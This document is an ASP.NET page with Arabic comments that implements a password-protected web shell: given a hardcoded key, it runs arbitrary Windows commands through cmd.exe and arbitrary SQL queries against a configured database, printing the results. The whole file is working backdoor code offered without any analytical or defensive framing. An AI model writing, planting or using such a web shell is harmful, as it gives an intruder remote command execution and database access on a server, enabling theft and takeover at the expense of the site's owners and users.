<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Data.SqlClient" %>

<script runat="server">
    private string password = "28112016"; // كلمة المرور للوصول
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request["key"] == password)
        {
            // تشغيل أوامر النظام
            if (Request["cmd"] != null)
            {
                ExecuteCommand(Request["cmd"]);
            }
            // تنفيذ استعلام SQL على قاعدة بيانات
            if (Request["sql"] != null)
            {
                ExecuteSQL(Request["sql"]);
            }
        }
        else
        {
            Response.Write("Unauthorized access.");
        }
    }

    // وظيفة لتنفيذ أوامر النظام
    private void ExecuteCommand(string command)
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + command;
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;

        Process process = Process.Start(psi);
        string output = process.StandardOutput.ReadToEnd();
        Response.Write("<pre>" + output + "</pre>");
    }

    // وظيفة لتنفيذ أوامر SQL
    private void ExecuteSQL(string query)
    {
        string connectionString = "Data Source=YOUR_SERVER;Initial Catalog=YOUR_DATABASE;User ID=YOUR_USER;Password=YOUR_DB_PASSWORD";
        using (SqlConnection connection = new SqlConnection(connectionString))
        {
            try
            {
                connection.Open();
                SqlCommand command = new SqlCommand(query, connection);
                SqlDataReader reader = command.ExecuteReader();
                while (reader.Read())
                {
                    for (int i = 0; i < reader.FieldCount; i++)
                    {
                        Response.Write(reader[i].ToString() + " ");
                    }
                    Response.Write("<br>");
                }
                reader.Close();
            }
            catch (Exception ex)
            {
                Response.Write("Error: " + ex.Message);
            }
        }
    }
</script>

<html>
<body>
    <form method="get">
        <input type="hidden" name="key" value="your_password" />
        Command: <input type="text" name="cmd" />
        SQL Query: <input type="text" name="sql" />
        <input type="submit" value="Execute" />
    </form>
</body>
</html>
